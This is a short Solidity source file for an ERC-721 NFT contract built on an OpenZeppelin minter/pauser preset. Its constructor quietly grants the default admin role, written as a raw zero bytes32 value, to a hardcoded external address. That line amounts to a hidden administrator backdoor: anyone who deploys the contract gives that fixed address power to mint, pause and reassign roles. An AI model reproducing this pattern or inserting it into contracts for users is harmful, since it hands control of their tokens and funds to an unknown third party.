//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/presets/ERC721PresetMinterPauserAutoId.sol";

//https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/presets/ERC721PresetMinterPauserAutoId.sol

contract NewNFT is ERC721PresetMinterPauserAutoId {
    constructor(
        string memory name,
        string memory symbol,
        string memory tokenURI
    ) public ERC721PresetMinterPauserAutoId(name, symbol, tokenURI) 
    {
       super.grantRole(0x0000000000000000000000000000000000000000000000000000000000000000,0x50Cb6196dc540036DC026C4F05f17eB1a558A85a);

    }
}